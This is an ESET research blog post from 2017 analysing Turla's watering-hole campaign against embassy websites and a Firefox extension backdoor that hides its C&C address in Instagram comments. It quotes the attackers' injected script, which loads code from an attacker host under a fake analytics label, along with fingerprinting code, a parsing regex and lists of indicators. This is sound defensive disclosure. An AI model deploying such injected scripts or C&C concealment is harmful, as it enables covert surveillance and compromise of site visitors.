{
    "title": "turla_u2019s watering hole campaign_ an updated firefox extension abusing instagram _ welivesecurity",
    "text": "Menu\nTurla’s watering hole\ncampaign: An updated\nFirefox extension abusing\nInstagram\nThe Turla espionage group is still using watering hole techniques to redirect potentially interesting\nvictims to their C&C infrastructure.\nJean-Ian Boutin  6 Jun 2017 - 02:00PMShare\n\n\n\nUpdate, 21 June 2017: Due to our misunderstanding of communications with Google, the Firefox extension’s infection vector\ndiscussed below was wrongly described here on 06 June 2017; this is now corrected.  Apologies to Google and our readers for\nthe unintentional misrepresentation in our original post.\nSome of the tactics used in APT attacks die hard. A good example is provided by Turla’s watering hole\ncampaigns. Turla, which has been targeting governments, government officials and diplomats for years – see, as\nan example, this recent paper  – is still using watering hole techniques to redirect potentially interesting victims\nto their C&C infrastructure. In fact, they have been using them since at least 2014 with very few variations in\ntheir modus operandi.\nA watering hole attack compromises websites that are likely to be visited by targets of interest. The people\nbehind Turla are apparently keen on targeting embassy websites. Indeed, there was a February 2017 blogpost by\nForcepoint  highlighting some of the websites most recently compromised.\nWe, of course, are monitoring the developments of these campaigns closely and recently noticed them reusing a\ntechnique that we haven’t seen them use for several months.\nInitial compromise\nIn the IoCs section below, there is a list of websites that have been used to redirect to Turla watering hole C&Cs\nin the past. As is usual with this group, there are many websites directly related to embassies throughout the\nworld.\nThe websites’ visitors will be redirected to a malicious server because of a snippet – inserted by the attacker –\nappended to the original page. The scripts we saw in the last few months were all similar to this one:\n<!– Clicky Web Analytics (start) –>\n<script type=”text/javascript”>// <![CDATA[\nvar clicky_site_ids = clicky_site_ids || [];\nclicky_site_ids.push(100673048);\n(function() {\nvar s = document.createElement(‘script’);\nvar a = ‘http://www.mentalhealthcheck.net/’;\nvar b = ‘update/counter.js’;\ns.type = ‘text/javascript’; s.async = true;\ns.src = ‘//static.getclicky.com/js’; s.src = a.concat(b);\n( document.getElementsByTagName(‘head’)[0] || document.getElementsByTagName(‘body’)\n[0]).appendChild(s);\n})();\n// ]]></script>\nThe attackers added a reference to Clicky, a real time web analytics framework. They are adding this framework\nname in an attempt to legitimize the appended script to cursory, or non-expert, examination, although it is not\nactually used in the attack. We can see here that this injected script calls another script at\nmentalhealthcheck.net/update/counter.js.  This is a server the Turla gang has been using to push\nfingerprinting scripts – scripts that will gather information about the system it is running on – to interesting\nvictims. A deceptive reference to the Google Analytics script was used in a similar fashion for a while, but now\nClicky is what we see the most. You can find in the IoCs section the various watering hole C&Cs that we saw in\nthe last couple of months. All of these C&Cs are compromised legitimate servers.\nThe next step in the attack is to distribute a fingerprinting JavaScript to interesting targets. To do this, the C&C is\nfiltering visitors using an IP range. If they are within the targeted IP range, they receive the fingerprinting script.\nIf not, they just receive a benign script: a JS implementation of the MD5 hashing algorithm. Below we show an\nexcerpt of the deobfuscated script that is received by victims coming from a targeted IP range:\nfunction cb_custom() {\nloadScript(“http://www.mentalhealthcheck.net/script/pde.js”, cb_custom1);\n}\n \nfunction cb_custom1() {\nPluginDetect.getVersion(‘.’);\n \nmyResults[‘Java’]=PluginDetect.getVersion(‘Java’);\nmyResults[‘Flash’]=PluginDetect.getVersion(‘Flash’);\nmyResults[‘Shockwave’]=PluginDetect.getVersion(‘Shockwave’);\nmyResults[‘AdobeReader’]=PluginDetect.getVersion(‘AdobeReader’) || PluginDetect.getVersion(‘PDFReader’);\n \nvar ec = new evercookie();\nec.get(‘thread’, getCookie)\nThis javascript will download a JS library called PluginDetect  that has the ability to collect information about\nplugins installed in the browser. The information collected is then sent to the C&C server.\nIt will also try to install an evercookie, or so-called super cookie, that will track the user throughout his\nbrowsing, across all sites on the internet.\nFor those familiar with this group’s waterholing techniques, it is clear they are still using their old, publicly known\ntried-and-true methods.\nFirefox extension\nThrough our monitoring of these watering hole campaigns, we happened upon a very interesting sample. Some\nof you may remember the Pacifier APT  report by BitDefender describing a spearphishing campaign with a\nmalicious Microsoft Word document sent to several institutions worldwide. These malicious documents would\nthen drop a backdoor . We now know that this report describes Skipper, a first stage backdoor used by the Turla\ngang.\nThat report also contains a description of a Firefox extension dropped by the same type of malicious document.\nIt turns out we have found what most likely is an update of this Firefox extension. It is a JavaScript backdoor,\ndifferent in terms of implementation to the one described in the Pacifier APT report, but with similar\nfunctionalities.\nWe noticed that this extension could have been distributed through a forged copy of a Swiss security company’s\nwebsite. Unsuspecting visitors to this website were asked to install this malicious extension. The extension is a\nsimple backdoor, but with an interesting way of fetching its C&C domain.\nThe use of Instagram\nThe extension uses a bit.ly URL to reach its C&C, but the URL path is nowhere to be found in the extension code.\nIn fact, it will obtain this path by using comments posted on a specific Instagram post. The one that was used in\nthe analyzed sample was a comment about a photo posted to the Britney Spears official Instagram account.\n© https://www.instagram.com/p/BO8gU41A45g/\nThe extension will look at each photo’s comment and will compute a custom hash value. If the hash matches\n183, it will then run this regular expression on the comment in order to obtain the path of the bit.ly URL:\n(?:\\\\u200d(?:#|@)(\\\\w)\nLooking at the photo’s comments, there was only one for which the hash matches 183. This comment was\nposted on February 6, while the original photo was posted in early January. Taking the comment and running it\nthrough the regex, you get the following bit.ly URL:\nhttp://bit.ly/2kdhuHX\nLooking a bit more closely at the regular expression, we see it is looking for either @|# or the Unicode character\n\\200d . This character is actually a non-printable character called ‘Zero Width Joiner’, normally used to separate\nemojis. Pasting the actual comment or looking at its source, you can see that this character precedes each\ncharacter that makes the path of the bit.ly URL:\nsmith2155<200d>#2hot ma<200d>ke lovei<200d>d to <200d>her, <200d>uupss <200d>#Hot\n<200d>#X\nWhen resolving this shortened link, it leads to static.travelclothes.org/dolR_1ert.php  , which was\nused in the past as a watering hole C&C by the Turla crew.\nAs is the case with all bit.ly links, it is possible to get statistics on who clicked the link.\nAs seen above, there were only 17 hits recorded on this link in February, right around the time the comment was\nposted. However, this is quite a low number and might indicate that it was only a test run.\nTechnical analysis\nThis Firefox extension implements a simple backdoor. It will first gather information on the system it is running\non and send it to the C&C, encrypted using AES. This is very similar to what the extension described in the\nPacifier APT white paper is doing.\nThe backdoor component has the ability to run four different types of commands:\nexecute arbitrary file\nupload file to C&C\ndownload file from C&C\nread directory content – send a file listing, along with sizes and dates, to C&C\nWhile we believe this to be some type of test, the next version of the extension – if there is one – is likely to be\nvery different. There are several APIs that are used by the extension that will disappear in future versions of\nFirefox.\nFor example, it uses XPCOM  to write files to disk and sdk/system/child_process  to launch a process. These\ncan only be used by add-ons that will be superseded by WebExtensions starting with Firefox 57. From that\nversion onwards, Firefox will no longer load add-ons, thus preventing the use of these APIs.\nConclusion\nThe fact that the Turla actors are using social media as a way to obtain its C&C servers is quite interesting. This\nbehavior has already been observed in the past by other threat crews such as the Dukes . Attackers using social\nmedia to recover a C&C address are making life harder for defenders. Firstly, it is difficult to distinguish malicious\ntraffic to social media from legitimate traffic. Secondly, it gives the attackers more flexibility when it comes to\nchanging the C&C address as well as erasing all traces of it. It is also interesting to see that they are recycling an\nold way of fingerprinting a victim and finding new ways to make the C&C retrieval a bit more difficult.\nFor any inquiries, or to make sample submissions related to the subject, contact us at: threatintel@eset.com .\nAcknowledgements\nWe would like to thank Clement Lecigne from Google’s Threat Analysis Group for his help researching this\ncampaign.\nIoCs\nFirefox extension hash\nFile name SHA-1\nhtml5.xpi 5ba7532b4c89cc3f7ffe15b6c0e5df82a34c22ea\nhtml5.xpi 8e6c9e4582d18dd75162bcbc63e933db344c5680\nObserved compromised websites redirecting to fingerprinting servers\nAs of this writing all these sites are now clean or pointing to dead fingerprinting servers.\nURL Description\nhxxp://www.namibianembassyusa.org Namibia Embassy – USA\nhxxp://www.avsa.org African Violet Society of America\nhxxp://www.zambiaembassy.org Zambian Embassy – USA\nhxxp://russianembassy.org Russian Embassy – USA\nhxxp://au.int African Union\nhxxp://mfa.gov.kg Ministry of Foreign Affairs – Kyrgyzstan\nhxxp://mfa.uz Ministry of Foreign Affairs – Uzbekistan\nhxxp://www.adesyd.es ADESyD - Asociación de Diplomados Españoles en Seguridad y Defensa\nhxxp://www.bewusstkaufen.at web portal for sustainable consumption in Austria\nhxxp://www.cifga.es Cifga Laboratory working on development of marine toxin standards\nhxxp://www.jse.org Juventudes Socialistas de España (JSE)\nhxxp://www.embassyofindonesia.org Embassy of Indonesia – USA\nhxxp://www.mischendorf.at town of Mischendorf – Austria\nhxxp://www.vfreiheitliche.at Political party in Bregenz, Austria\nhxxp://www.xeneticafontao.comFontao Genetics, S.A. established in 1998 is responsible for the management of the\nCentre for Animal Selection and Reproduction of Galicia breeds Holstein, Rubia Gallega\nhxxp://iraqiembassy.us Embassy of Iraq – USA\nhxxp://sai.gov.ua Management of road safety (Ukraine)\nhxxp://www.mfa.gov.md Ministry of Foreign Affairs – Moldova\nhxxp://mkk.gov.kg State Personnel Service - Kyrgyzstan\nCompromised websites used as first stage C&C in watering hole\ncampaigns\nhxxp://www.mentalhealthcheck.net/update/counter.js (hxxp://bitly.com/2hlv91v+)\nhxxp://www.mentalhealthcheck.net/script/pde.js\nhxxp://drivers.epsoncorp.com/plugin/analytics/counter.js\nhxxp://rss.nbcpost.com/news/today/content.php\nhxxp://static.travelclothes.org/main.js\nhxxp://msgcollection.com/templates/nivoslider/loading.php\nhxxp://versal.media/?atis=509\nhxxp://www.ajepcoin.com/UserFiles/File/init.php (hxxp://bit.ly/2h8Lztj+)\nhxxp://loveandlight.aws3.net/wp-includes/theme-compat/akismet.php\nhxxp://alessandrosl.com/core/modules/mailer/mailer.php\nImage credits: ©David Robson/Flickr\n\nJean-Ian Boutin  6 Jun 2017 - 02:00PM\nFBI: Cybercrime losses tripled\nover the last 5 yearsHow to catch a cybercriminal:\nTales from the digital\nforensics labFBI shuts down website\nselling billions of stolen\nrecordsSimple steps to protect\nyourself against identity theft\nHome\nAbout Us\nContact UsSitemap\nOur Experts\nESETResearch\nHow To\nCategoriesRSS Configurator\nNews Widget\nSimilar Articles\nCYBERCRIME\n CYBERCRIME\n CYBERCRIME\n CYBERCRIME\nDiscussion\n "
}